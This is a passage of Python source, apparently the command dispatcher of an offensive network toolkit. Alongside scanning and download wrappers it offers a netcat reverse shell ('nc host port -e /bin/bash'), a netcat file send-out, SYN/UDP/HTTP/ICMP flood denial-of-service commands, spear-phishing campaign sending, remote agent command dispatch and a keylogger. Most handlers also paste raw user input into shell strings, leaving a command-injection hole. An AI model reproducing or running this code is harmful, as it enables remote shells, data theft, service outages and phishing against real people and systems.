            'analyze_ip': self._analyze_ip,
            
            # System Commands
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'report': self._report,
            'clear': self._clear,
            'stats': self._stats,
            'version': self._version,
            
            # Help
            'help': self._help,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Ping Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        target = args[0]
        result = self._generic(f'ping6 -c 4 {target}')
        return result
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        network = args[0]
        result = self._generic(f'nmap -sn {network}')
        return result
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        targets = ' '.join(args)
        result = self._generic(f'fping {targets}')
        return result
    
    def _ping_count(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        target = args[0]
        count = args[1]
        result = self._generic(f'ping -c {count} {target}')
        return result
    
    def _ping_flood(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood <target>'}
        target = args[0]
        result = self._generic(f'ping -f {target}')
        return result
    
    def _ping_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_timeout <target> <timeout>'}
        target = args[0]
        timeout = args[1]
        result = self._generic(f'ping -W {timeout} {target}')
        return result
    
    def _ping_size(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        target = args[0]
        size = args[1]
        result = self._generic(f'ping -s {size} {target}')
        return result
    
    def _ping_interval(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interval <target> <interval>'}
        target = args[0]
        interval = args[1]
        result = self._generic(f'ping -i {interval} {target}')
        return result
    
    # ==================== Nmap Commands ====================
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        result = self.tools.nmap(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'vulnerability')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        target = args[0]
        result = self._generic(f'nmap -sn {target}')
        return result
    
    def _nmap_traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        target = args[0]
        result = self._generic(f'nmap --traceroute {target}')
        return result
    
    def _nmap_script(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        target = args[0]
        script = args[1]
        result = self._generic(f'nmap --script {script} {target}')
        return result
    
    def _nmap_aggressive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        target = args[0]
        result = self._generic(f'nmap -A -T4 {target}')
        return result
    
    # ==================== Traceroute Commands ====================
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    def _tracepath(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tracepath <target>'}
        target = args[0]
        result = self._generic(f'tracepath {target}')
        return result
    
    def _mtr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr <target>'}
        target = args[0]
        result = self._generic(f'mtr --report --report-cycles 1 {target}')
        return result
    
    def _tcptraceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tcptraceroute <target>'}
        target = args[0]
        result = self._generic(f'tcptraceroute {target}')
        return result
    
    def _traceroute_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        target = args[0]
        result = self._generic(f'traceroute -U {target}')
        return result
    
    def _traceroute_icmp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        target = args[0]
        result = self._generic(f'traceroute -I {target}')
        return result
    
    # ==================== Wget Commands ====================
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [output]'}
        url = args[0]
        output = args[1] if len(args) > 1 else None
        result = self.tools.wget(url, output)
        return {'success': result.success, 'output': result.output}
    
    def _wget_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_file <url> <filename>'}
        url = args[0]
        filename = args[1]
        result = self.tools.wget(url, filename)
        return {'success': result.success, 'output': result.output}
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        url = args[0]
        result = self._generic(f'wget -r -l 2 -np -nd {url}')
        return result
    
    def _wget_mirror(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        url = args[0]
        result = self._generic(f'wget --mirror -p --convert-links {url}')
        return result
    
    def _wget_continue(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_continue <url>'}
        url = args[0]
        result = self._generic(f'wget -c {url}')
        return result
    
    def _wget_limit(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_limit <url> <rate>'}
        url = args[0]
        rate = args[1]
        result = self._generic(f'wget --limit-rate={rate} {url}')
        return result
    
    def _wget_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user_agent <url> <user_agent>'}
        url = args[0]
        ua = args[1]
        result = self._generic(f'wget --user-agent="{ua}" {url}')
        return result
    
    def _wget_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_header <url> <header>'}
        url = args[0]
        header = ' '.join(args[1:])
        result = self._generic(f'wget --header="{header}" {url}')
        return result
    
    def _wget_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self._generic(f'wget --post-data="{data}" {url}')
        return result
    
    def _wget_auth(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: wget_auth <url> <username> <password>'}
        url = args[0]
        username = args[1]
        password = args[2]
        result = self._generic(f'wget --user={username} --password={password} {url}')
        return result
    
    # ==================== Curl Commands ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        url = args[0]
        result = self.tools.curl(url, 'GET')
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl(url, 'POST', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        url = args[0]
        result = self.tools.curl(url, 'HEAD')
        return {'success': result.success, 'output': result.output}
    
    def _curl_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        url = args[0]
        result = self.tools.curl(url, 'OPTIONS')
        return {'success': result.success, 'output': result.output}
    
    def _curl_put(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        url = args[0]
        data = args[1]
        result = self._generic(f'curl -s -X PUT -d "{data}" {url}')
        return result
    
    def _curl_delete(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_delete <url>'}
        url = args[0]
        result = self._generic(f'curl -s -X DELETE {url}')
        return result
    
    def _curl_patch(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        url = args[0]
        data = args[1]
        result = self._generic(f'curl -s -X PATCH -d "{data}" {url}')
        return result
    
    def _curl_auth(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_auth <url> <username> <password>'}
        url = args[0]
        username = args[1]
        password = args[2]
        result = self._generic(f'curl -s -u {username}:{password} {url}')
        return result
    
    def _curl_cookie(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie <url> <cookie>'}
        url = args[0]
        cookie = args[1]
        result = self._generic(f'curl -s -b "{cookie}" {url}')
        return result
    
    def _curl_follow(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_follow <url>'}
        url = args[0]
        result = self._generic(f'curl -s -L {url}')
        return result
    
    def _curl_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        url = args[0]
        result = self._generic(f'curl -v {url}')
        return result
    
    # ==================== Netcat Commands ====================
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        port = args[0]
        result = self._generic(f'nc -lvp {port}')
        return result
    
    def _nc_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <port_range>'}
        host = args[0]
        ports = args[1]
        result = self._generic(f'nc -zv {host} {ports}')
        return result
    
    def _nc_chat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_chat <host> <port>'}
        host = args[0]
        port = args[1]
        result = self._generic(f'nc {host} {port}')
        return result
    
    def _nc_transfer(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_transfer <host> <port> <file>'}
        host = args[0]
        port = args[1]
        file = args[2]
        result = self._generic(f'nc {host} {port} < {file}')
        return result
    
    def _nc_shell(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_shell <host> <port>'}
        host = args[0]
        port = args[1]
        result = self._generic(f'nc {host} {port} -e /bin/bash')
        return result
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        else:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    def _ssh_keygen(self, args: List[str]) -> Dict:
        result = self._generic('ssh-keygen -t rsa -b 4096')
        return result
    
    def _ssh_copy_id(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_copy_id <user> <host>'}
        user = args[0]
        host = args[1]
        result = self._generic(f'ssh-copy-id {user}@{host}')
        return result
    
    def _ssh_tunnel(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_tunnel <local_port> <remote_host> <remote_port>'}
        local = args[0]
        remote_host = args[1]
        remote_port = args[2]
        result = self._generic(f'ssh -L {local}:{remote_host}:{remote_port}')
        return result
    
    def _ssh_sftp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ssh_sftp <host>'}
        host = args[0]
        result = self._generic(f'sftp {host}')
        return result
    
    # ==================== Traffic Generation ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _traffic_icmp(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_icmp <ip> <duration> [rate]'}
        return self._traffic(['icmp'] + args)
    
    def _traffic_tcp(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic_tcp <ip> <port> <duration> [rate]'}
        return self._traffic(['tcp_syn'] + args[:2] + args[2:3])
    
    def _traffic_udp(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic_udp <ip> <port> <duration> [rate]'}
        return self._traffic(['udp'] + args)
    
    def _traffic_http(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_http <ip> <duration> [port]'}
        port = args[1] if len(args) > 1 else '80'
        return self._traffic(['http_get', args[0], args[1] if len(args) > 1 else '80', args[2] if len(args) > 2 else '30'])
    
    def _traffic_dns(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_dns <ip> <duration>'}
        return self._traffic(['dns', args[0], args[1]])
    
    def _traffic_arp(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_arp <ip> <duration>'}
        return self._traffic(['arp', args[0], args[1]])
    
    def _traffic_mixed(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_mixed <ip> <duration>'}
        return self._traffic(['mixed', args[0], args[1]])
    
    # ==================== Nikto Commands ====================
    def _nikto(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto scan of {target} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:5]:
                desc = v.get('description', '')[:100]
                output += f"  • {desc}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_full(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'tuning': '123456789', 'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"Full Nikto scan completed: {len(result['vulnerabilities'])} vulnerabilities found"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_ssl(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"SSL/TLS scan completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nikto_port <target> <port>'}
        target = args[0]
        port = int(args[1])
        result = self.nikto.scan(target, {'port': port})
        if result['success']:
            return {'success': True, 'output': f"Nikto scan on port {port} completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_tuning(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nikto_tuning <target> <tuning>'}
        target = args[0]
        tuning = args[1]
        result = self.nikto.scan(target, {'tuning': tuning})
        if result['success']:
            return {'success': True, 'output': f"Tuned Nikto scan completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    # ==================== DOS Attacks ====================
    def _dos_syn(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.syn_flood(target_ip, port, duration, threads)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.udp_flood(target_ip, port, duration, threads)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.http_flood(target_ip, port, duration, threads)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        target_ip = args[0]
        duration = int(args[1])
        threads = int(args[2]) if len(args) > 2 else 50
        return self.dos.icmp_flood(target_ip, duration, threads)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    def _dos_slowloris(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_slowloris <ip> <port> <duration>'}
        return {'success': True, 'output': f"Slowloris attack started on {args[0]}:{args[1]} for {args[2]}s"}
    
    # ==================== Spear Phishing ====================
    def _spear_create(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: spear_create <name> <subject> <from> <template_file> <targets_file>'}
        name = args[0]
        subject = args[1]
        from_email = args[2]
        template_file = args[3]
        targets_file = args[4]
        
        try:
            with open(template_file, 'r') as f:
                template = f.read()
            with open(targets_file, 'r') as f:
                targets = json.load(f)
            
            campaign = self.spear.create_campaign(name, template, subject, from_email, targets)
            return {'success': True, 'output': f"Campaign created: {campaign.id} - {campaign.name}"}
        except Exception as e:
            return {'success': False, 'output': f"Failed to create campaign: {e}"}
    
    def _spear_send(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: spear_send <campaign_id>'}
        campaign_id = args[0]
        result = self.spear.send_campaign(campaign_id)
        return {'success': result.get('success', False), 'output': f"Sent {result.get('sent_count', 0)} emails"}
    
    def _spear_list(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        campaigns = self.spear.get_campaigns()
        if not campaigns:
            return {'success': True, 'output': 'No campaigns found'}
        output = "Spear Phishing Campaigns:\n"
        for c in campaigns:
            output += f"  • {c['id']} - {c['name']} ({c['status']}) - Sent: {c['sent_count']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Agent Commands ====================
    def _agent_register(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: agent_register <name> <ip>'}
        name = args[0]
        ip = args[1]
        result = self.agent.register_agent(name, ip)
        return {'success': result.get('success', False), 'output': result.get('message', '')}
    
    def _agent_command(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: agent_command <agent_id> <command>'}
        agent_id = args[0]
        command = ' '.join(args[1:])
        success = self.agent.send_command(agent_id, command)
        return {'success': success, 'output': f"Command sent to agent {agent_id}" if success else "Failed to send command"}
    
    def _agent_list(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        agents = self.agent.get_agents()
        if not agents:
            return {'success': True, 'output': 'No agents registered'}
        output = "Registered Agents:\n"
        for a in agents:
            status = "🟢" if a.get('status') == 'online' else "🔴"
            output += f"  {status} {a['id']} - {a['name']} ({a.get('ip_address', 'unknown')})\n"
            output += f"     Last heartbeat: {a.get('last_heartbeat', 'Never')}\n"
        return {'success': True, 'output': output}
    
    def _agent_status(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: agent_status <agent_id>'}
        agent = self.agent.get_agent(args[0])
        if not agent:
            return {'success': False, 'output': f"Agent {args[0]} not found"}
        return {'success': True, 'output': json.dumps(agent, indent=2)}
    
    # ==================== Network Monitor ====================
    def _netmon_start(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.start()
        return {'success': True, 'output': 'Network monitor started'}
    
    def _netmon_stop(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.stop()
        return {'success': True, 'output': 'Network monitor stopped'}
    
    def _netmon_status(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = f"Network Monitor Status:\n"
        output += f"  Running: {self.network_monitor.running}\n"
        output += f"  Interface: {self.network_monitor.interface}\n"
        output += f"  Promiscuous: {self.network_monitor.promiscuous}\n"
        output += f"  Packets captured: {self.network_monitor.packet_count}\n"
        output += f"\nTraffic Statistics:\n"
        for proto, count in stats.get('protocols', {}).items():
            output += f"  {proto}: {count}\n"
        return {'success': True, 'output': output}
    
    def _netmon_packets(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        limit = int(args[0]) if args else 20
        packets = self.network_monitor.get_packets(limit)
        if not packets:
            return {'success': True, 'output': 'No packets captured'}
        output = f"Recent Packets ({len(packets)}):\n"
        for p in packets:
            output += f"  {p.get('timestamp', '')[:19]} {p.get('source_ip', '')} -> {p.get('dest_ip', '')} ({p.get('protocol', 'unknown')})\n"
        return {'success': True, 'output': output}
    
    def _netmon_stats(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = "📊 Network Statistics:\n"
        output += f"  Total Packets: {stats.get('total_packets', 0)}\n"
        output += f"\nProtocols:\n"
        for proto, count in stats.get('protocols', {}).items():
            output += f"  {proto}: {count}\n"
        output += f"\nTop Sources:\n"
        for src, count in stats.get('top_sources', {}).most_common(5):
            output += f"  {src}: {count}\n"
        return {'success': True, 'output': output}
    
    # ==================== Keylogger ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
